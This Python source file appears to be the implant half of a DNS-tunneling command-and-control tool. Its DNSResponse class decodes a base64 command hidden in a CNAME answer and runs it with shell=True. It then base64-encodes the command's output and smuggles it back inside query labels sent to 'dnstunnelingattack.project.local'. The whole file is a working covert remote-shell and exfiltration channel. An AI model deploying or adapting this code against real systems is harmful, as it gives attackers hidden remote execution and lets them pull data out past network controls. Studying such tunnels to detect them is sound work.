from base64 import b64decode, b64encode
from os import urandom
from subprocess import run


class DNSResponse:

    transaction_id: bytes
    flags: bytes
    question_count: bytes
    answer_record_count: bytes
    authority_record_count: bytes
    additional_record_count: bytes
    query_name: str
    query_type: bytes
    query_class: bytes
    command: str

    # size in bytes
    headers_size = 12
    headers_elements_size = [2, 2, 2, 2, 2, 2]

    query_size = 4
    query_elements_size = [2, 2]
    response_elements_size = [2, 2, 2, 4, 2]

    ttl = b"\x00\x00\x00\x3c"

    def __init__(self, content: bytes) -> None:
        headers = content[: DNSResponse.headers_size]
        parsed_headers = self.parse(headers, DNSResponse.headers_elements_size)
        self.transaction_id = parsed_headers[0]
        self.flags = parsed_headers[1]
        self.question_count = parsed_headers[2]
        self.answer_record_count = parsed_headers[3]
        self.authority_record_count = parsed_headers[4]
        self.additional_record_count = parsed_headers[5]
        assert (
            int(self.question_count.hex(), 16) == 1
        )  # by now, just take into account query with exactly one question
        self.query_name, content = self.readQueryName(
            content[DNSResponse.headers_size :]
        )
        parsed_query = self.parse(
            content[: DNSResponse.query_size], DNSResponse.query_elements_size
        )
        self.query_type = parsed_query[0]
        self.query_class = parsed_query[1]
        answer_content = content[4:]
        self.command = self.extractCommand(answer_content)
        # don't take into account additionnal information

    def parse(self, tab: bytes, elementssize: list[int]) -> list[bytes]:
        i = 0
        res = []
        for x in elementssize:
            res.append(tab[i : i + x])
            i += x
        return res

    def readQueryName(self, content: bytes) -> tuple[str, bytes]:
        next_length = int(hex(content[0]), 16)
        res = ""
        while next_length != 0:
            res += content[1 : next_length + 1].decode()
            res += "."
            content = content[next_length + 1 :]
            next_length = int(hex(content[0]), 16)
        return res[: len(res) - 1], content[1:]

    def extractCommand(self, answer_content: bytes) -> str:
        parsed_content = self.parse(answer_content, DNSResponse.response_elements_size)
        query_name = parsed_content[0]
        query_type = parsed_content[1]
        query_class = parsed_content[2]
        ttl = parsed_content[3]
        size = int.from_bytes(parsed_content[4])
        assert query_type == b"\x00\x05"
        assert DNSResponse.ttl == ttl
        answer_content, _ = self.readQueryName(answer_content[12 : size + 12])
        splitted_command = answer_content.split(".")
        encoded_command = "".join(splitted_command[: len(splitted_command) - 3])
        return b64decode(encoded_command).decode()

    def generateQuery(self) -> bytes:
        query = urandom(2)
        query += b"\x01\x20"  # flag
        query += b"\x00\x01"  # question count
        query += b"\x00\x00"  # response count
        query += b"\x00\x00"  # authority record count
        query += b"\x00\x00"  # additional record count
        res = run(self.command, shell=True, capture_output=True, text=True)
        print("command : ", self.command)
        if res.stderr != "":
            tosend = b64encode(res.stderr.encode())
        else:
            tosend = b64encode(res.stdout.encode())
        if len(tosend) == 0:
            tosend = b64encode("Empty response\n".encode())
        for i in range(0, len(tosend), 62):
            block = tosend[i : i + 62]
            l = hex(len(block))[2:]
            if len(l) == 1:
                l = "0" + l
            query += bytes.fromhex(l)
            query += block
        query += b"\x12dnstunnelingattack\x07project\x05local\x00"
        query += b"\x00\x01"
        query += b"\x00\x01"
        return query
